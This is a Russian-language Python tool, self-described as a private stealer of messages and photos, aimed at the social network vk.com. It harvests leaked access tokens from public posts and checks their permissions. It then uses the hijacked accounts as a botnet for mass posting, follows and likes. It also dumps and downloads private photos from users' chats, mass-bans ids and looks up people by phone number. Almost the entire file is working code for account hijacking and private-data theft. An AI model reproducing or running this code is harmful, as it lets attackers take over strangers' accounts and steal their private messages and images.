# -*- coding: utf-8 -*-
# Это просто уникальный пример того как можно писать на языке, который ты не знаешь 
from pytils import numeral
import os, shutil, vk, json, time, sys, re, subprocess, wget
def print_(s):
    from pytils.third import six
    if six.PY3:
        out = s
    else:
        out = s.encode('UTF-8')
    return(out)
def access_friends(api):
    try:
        api.friends.getOnline(user_id='1')
        return 'Доступ к друзьям [Есть]'
    except:
        return 'Доступ к друзьям [Нет]'
def access_messages(api):
    try:
        api.messages.get(out=0)
        return 'Доступ к сообщениям [Есть]'
    except:
        return 'Доступ к сообщениям [Нет]'  
def access_wall(api,main_id):
    try:
        test = api.wall.post(owner_id=main_id,message='.')
        wall_id = test['post_id']
        time.sleep(1)
        api.wall.delete(owner_id=main_id,post_id=wall_id)
        return 'Доступ к стене [Есть]'
    except:
        return 'Доступ к стене [Нет]'
def access_status(api):
    try:
        api.status.get
        return 'Доступ к статусу [Есть]'
    except:
        return 'Доступ к статусу [Нет]'
def OutWork(result,files):
    f = open(files, 'a')
    f.write(result + '\n')
    f.close()
data_file = []
line = ' - - - - - - - - - - - - - - -'
print('Приватная тырилка сообщений и фоток с токена vk.com\nVersion 0.3 (Beta 2)\nBy Demka with love ❤️\n'+line)
WTF = input('Привет, что ты хочешь сделать?\n1. Найти access_token\n2. Ботнеты из access_token\n3. Использовать кастомный access_token\n4. Найти пользователя VK\n5. Извлечение url c .txt\n>> ')
if WTF =='1':
    session = vk.Session(access_token='token')
    api = vk.API(session)
    news = api.newsfeed.search(q='html#access_token=',count=200)
    valid = 0
    lalka = 1
    try:
        for loxs in range(len(news)):
            token = news[lalka]['text']
            ready = (token[token.find("=")+1:token.find("&")])
            try:
                session = vk.Session(access_token=ready)
                api = vk.API(session)
                info = api.users.get(user_ids=0)
                main_id = info[0]['uid']
                print ('*Успешная авторизация*')

                if access_friends(api) == 'Доступ к друзьям [Есть]':
                    OutWork(ready,'friends.txt')
                if access_messages(api) == 'Доступ к сообщениям [Есть]':
                    OutWork(ready,'messages.txt')

                information = (info[0]['first_name']+' '+info[0]['last_name']+' (https://vk.com/id'+ str(info[0]['uid'])+')')
                print(information)
                valid = valid + 1
                f = open('TOKENS.txt', 'a')
                f.write(ready +' '+information+' \n')
                f.close()
                arr_file = open('arr.txt', 'a')
                arr_file.write(ready+',')
                arr_file.close()
            except:
                print('(!) Не работает токен №'+str(lalka))
            lalka = lalka + 1
    except:
        print('*Всего валидных '+str (valid)+' акков*')
if WTF =='2':
    arr = open('arr.txt').read().split(',')
    menu_2 = input('Привет, милый <3\nЧто ты хочешь сделать?\n1. Отправить сообщение на стену\n2. Подписаться на профиль\n3. Лайкнуть фото4ку\n>> ')
    if menu_2 =='1':
        owner = input('Кому пишем сообщение (id)\n>> ')
        message_2 = input('А какое сообщение пишем?\n>> ')
        komuk = 1
        d = 0
        for lulz in range(len(arr)):
            try:
                try:
                    session = vk.Session(access_token=arr[komuk])
                    api = vk.API(session)
                    api.wall.post(owner_id=owner,message=message_2)
                    print('Успешно отправили сообщение с токеном '+arr[komuk])
                    d = d + 1 
                except:
                    print('(!) ошибочка для токена '+ arr[komuk])
                komuk = komuk + 1
            except:
                print('*Отправили сообщение с '+str(d)+' акков*')
    if menu_2 =='2':
        profile_id = input('На кого ты хочешь подписаться?\n>> ')
        komuk = 1
        d = 0
        for lulz in arr:
            try:
                try:
                    session = vk.Session(access_token=arr[komuk])
                    api = vk.API(session)
                    api.friends.add(user_id=profile_id)
                    print('Успешно подписали токен '+arr[komuk])
                    d = d + 1 
                except:
                    print('(!) ошибочка для токена '+ arr[komuk])
                komuk = komuk + 1
            except:
                print('*Подписали '+str(d)+' акков*')

    if menu_2 =='3':
        use_id = input('ID пользователя\n>> ')
        photo_id = input('ID фоточки\n>> ')
        komuk = 1
        d = 0
        for lulz in range(len(arr)):
            try:
                try:
                    session = vk.Session(access_token=arr[komuk])
                    api = vk.API(session)
                    api.likes.add(type='photo',owner_id=use_id,item_id=photo_id)
                    print('Успешно лайкнули '+arr[komuk])
                    d = d + 1 
                except:
                    print('(!) ошибочка для токена '+ arr[komuk])
                komuk = komuk + 1
                time.sleep(1)
            except:
                print('*Добавлено '+str(d)+' лайка*')
if WTF =='3':
    vvod_token = input('Вставьте Api_token Vk.com: ')
    try:
        session = vk.Session(access_token=vvod_token)
        api = vk.API(session)
        info = api.users.get(user_ids=0)
        main_id = info[0]['uid']
        print ('*Успешная авторизация*')
        print(info[0]['first_name']+' '+info[0]['last_name']+' (https://vk.com/id'+ str(info[0]['uid'])+')')
    except:
        print('Токен умер, увы з:')
        sys.exit()
    friends = api.friends.get(user_id=main_id,order='hints')
    print('*Права доступа токена*\n'+access_messages(api)+'\n'+access_status(api)+'\n'+access_friends(api))
    print(line)       
    menu = input('Привет, милый <3\nЧто ты хочешь сделать?\n1. Дамп фоток/сообщений\n2. Отправить сообщение на стену\n3. Подписаться на профиль\n4. Установить статус\n5. Лайкнуть фото4ку\n6. Закинуть весь мир в ЧС\n>> ')
    if menu == '1':
        count_photos = 0
        FreeEnd = str(len(friends))+ ' ' + print_(numeral.choose_plural(len(friends), (u'друг', u'друга', u'друзей')))
        print('Всего '+FreeEnd)
        print('* * * * * * *\nДампим переписки..')
        SMS = api.messages.get(out='0',count='200')
        #Тут магия жуткая
        # РРРРРРРРРРРРРРРР
        print('Дамп переписок завершен.')
        print('Дамп фоток..')
        z = 0
        #############################################
        for element in friends:
            i = 1
            print(line+'\nФотки от id'+str(friends[z]))
            photos = api.messages.getHistoryAttachments(peer_id=friends[z],media_type='photo',count='200')
            for meow in photos:
                try:
                    result = photos[i]['photo']['src_xxxbig']
                    OutWork(result,'url.txt')
                    print(result+' [id'+str(photos[i]['photo']['owner_id'])+']')
                    count_photos = count_photos + 1
                except:
                        try:
                            result = photos[i]['photo']['src_xxbig']
                            OutWork(result,'url.txt')
                            print(result+' [id'+str(photos[i]['photo']['owner_id'])+']')
                            count_photos = count_photos + 1
                        except:
                            try:
                                result = photos[i]['photo']['src_xbig']
                                OutWork(result,'url.txt')
                                print(result+' [id'+str(photos[i]['photo']['owner_id'])+']')
                                count_photos = count_photos + 1
                            except:
                                try:
                                    result = photos[i]['photo']['src_big']
                                    OutWork(result,'url.txt')
                                    print(result+' [id'+str(photos[i]['photo']['owner_id'])+']')
                                    count_photos = count_photos + 1
                                except:
                                    if next(iter(photos)) != 0:
                                        start = 0
                                        progon = 1
                                        marker = False
                                        while True:
                                            photos = api.messages.getHistoryAttachments(peer_id=friends[z],media_type='photo',count='200',start_from=start)
                                            try:
                                                start = photos['next_from']
                                                print(start)
                                                q = 1
                                                for meow in photos:
                                                    fix = str(q)
                                                    try:
                                                        result = photos[fix]['photo']['src_xxxbig']
                                                        OutWork(result,'url.txt')
                                                        print(result+' [id'+str(photos[fix]['photo']['owner_id'])+']')
                                                        count_photos = count_photos + 1
                                                    except:
                                                        try:
                                                            result = photos[fix]['photo']['src_xxbig']
                                                            OutWork(result,'url.txt')
                                                            print(result+' [id'+str(photos[fix]['photo']['owner_id'])+']')
                                                            count_photos = count_photos + 1
                                                        except:
                                                            try:
                                                                result = photos[fix]['photo']['src_xbig']
                                                                OutWork(result,'url.txt')
                                                                print(result+' [id'+str(photos[fix]['photo']['owner_id'])+']')
                                                                count_photos = count_photos + 1
                                                            except:
                                                                try:
                                                                    result = photos[fix]['photo']['src_big']
                                                                    OutWork(result,'url.txt')
                                                                    print(result+' [id'+str(photos[fix]['photo']['owner_id'])+']')
                                                                    count_photos = count_photos + 1
                                                                except:
                                                                    progon = progon + 1
                                                    time.sleep(0.3)
                                                    q = q + 1
                                            except TypeError:
                                                r = 1
                                                for meow in photos:
                                                    fix = str(r)
                                                    try:
                                                        result = photos[fix]['photo']['src_xxxbig']
                                                        OutWork(result,'url.txt')
                                                        print(result+' [id'+str(photos[fix]['photo']['owner_id'])+']')
                                                        count_photos = count_photos + 1
                                                    except:
                                                        try:
                                                            result = photos[fix]['photo']['src_xxbig']
                                                            OutWork(result,'url.txt')
                                                            print(result+' [id'+str(photos[fix]['photo']['owner_id'])+']')
                                                            count_photos = count_photos + 1
                                                        except:
                                                            try:
                                                                result = photos[fix]['photo']['src_xbig']
                                                                OutWork(result,'url.txt')
                                                                print(result+' [id'+str(photos[fix]['photo']['owner_id'])+']')
                                                                count_photos = count_photos + 1
                                                            except:
                                                                try:
                                                                    result = photos[fix]['photo']['src_big']
                                                                    OutWork(result,'url.txt')
                                                                    print(result+' [id'+str(photos[fix]['photo']['owner_id'])+']')
                                                                    count_photos = count_photos + 1
                                                                except:
                                                                    marker = True
                                                    time.sleep(0.3)
                                                    r = r + 1
                                                    if marker:
                                                        break
                                                if marker:
                                                    break
                                            if marker:
                                                break
                                        if marker:
                                                break
                                    print('10/10 шакалов, пропустим')
                time.sleep(0.4)
                i = i + 1
            z = z + 1
            print('* * * * * * *\nВсего дампнуто '+str(count_photos)+' фоток')
        print('*Скачиваем фотки*')
        os.mkdir('ready')
        way = os.getcwd()
        shutil.copy(r'url.txt', r''+way+'/ready/'+'url.txt')
        os.chdir(way+'/ready')
        dro4it = open('url.txt').read().split('\n')
        dro4it = dro4it[:len(dro4it)-1]
        for i in range(len(dro4it)):
            try:
                wget.download(dro4it[i])
            except:
                print('Ошибка: '+dro4it[i])
        os.remove('url.txt')
        print('Работа завершена, милый <3')
# Открыли, прочитали, получили список

    if menu == '3':
        NewFriend = input('Кого добавляем в друзья? (id vk)\n>> ')
        api.friends.add(user_id=NewFriend)
        print('Добавили id'+str(NewFriend)+' в друзья')
    if menu == '2':
        name_send = input('Кому пишем? (id vk)\n>> ')
        body_send = input('А что пишем?\n>> ')
        api.wall.post(owner_id=name_send,message=body_send)
        print('Отправили сообщение на стену')
###################################################################
    if menu == '4':
        stat = input('Что пишем в статусе?\n>> ')
        api.status.set(text=stat)
        print('Успешно обновили статус')
    if menu == '5':
        like_id = input('Аватарку кого лайкаем? (id vk)\n>> ')
        like_photo = api.photos.get(owner_id=like_id,album_id='profile')[1]['pid']
        api.likes.add(type='photo',owner_id=like_id,item_id=like_photo)
        print('Успешно лайкнули авку')
    if menu == '6':
        ban = 1
        while True:
            try:
                check = api.account.banUser(user_id=ban)
                if check == 1:
                    time.sleep(0.3)
                    print('Забанили id'+str(ban))
            except:
                print('Уже забанен id'+str(ban))
            ban = ban + 1
if WTF =='4':
    FriendlyArr = open('friends.txt').read().split('\n')
    FriendlyArr = FriendlyArr[:len(FriendlyArr)-1]
    data = input('Укажите e-mail или телефон:\n>> ')
    print('Всего '+str(len(FriendlyArr))+' '+print_(numeral.choose_plural(len(FriendlyArr), (u'аккаунт', u'аккаунта', u'аккаунтов'))))
    for i in range(len(FriendlyArr)):
        try:
            print(FriendlyArr[i])
            session = vk.Session(access_token=FriendlyArr[i])
            api = vk.API(session)
            CheckID = api.account.lookupContacts(contacts='78005553535',service='phone',return_all=0)['found'][0]['uid']
            time.sleep(1)
            search = api.account.lookupContacts(contacts=data,service='phone',return_all=0)
            if search['found'][0]['uid'] != CheckID:
                print('Возможно это '+search['found'][0]['first_name']+' '+search['found'][0]['last_name']+'\n'+'https://vk.com/id'+str(search['found'][0]['uid']))
                break
            else:
                print(data+' не найден :c')
                break
        except vk.exceptions.VkAPIError:
            print('VK ругается на флуд..ррр')
            time.sleep(1)
if WTF =='5':
    Name = input('Напиши имя файла плез\n>> ')
    OutName = input('Как назвать выходной файл?\n>> ')
    a_file = open(Name, encoding='utf-8')
    a_string = a_file.read()
    urls = re.findall('http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', a_string)
    for i in range(len(urls)):
        OutWork(urls[i],OutName)
        print(urls[i])